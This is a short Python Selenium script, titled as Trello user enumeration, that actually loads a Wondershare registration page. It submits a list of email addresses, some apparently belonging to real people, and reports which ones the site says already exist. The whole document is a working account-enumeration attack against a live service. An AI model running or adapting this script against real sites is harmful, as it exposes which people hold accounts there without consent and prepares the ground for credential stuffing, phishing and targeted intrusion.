#  User Enum trello
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import extract_html_diff

driver = webdriver.Edge(executable_path='msedgedriver')

print("The usernames present in trello are:")

for i in ["ccohen@aol.com", "batman@gmail.com", "koyex66140@tlhao86.com", "superman@gmail.com"]:

    user = i

    driver.get("https://accounts.wondershare.com/web/register?")
    p1 = driver.page_source
    elem=driver.find_element_by_xpath("//input[@type='text']") #type = 'text'/'email'
    #elem=driver.find_element_by_name("email")
    elem.send_keys(user)
    elem.send_keys(Keys.TAB)
    sleep(2)
    p2 = driver.page_source
    p3 = extract_html_diff.as_string(p2,p1)

    if "exists" in p3:
        print(i)
    sleep(2)
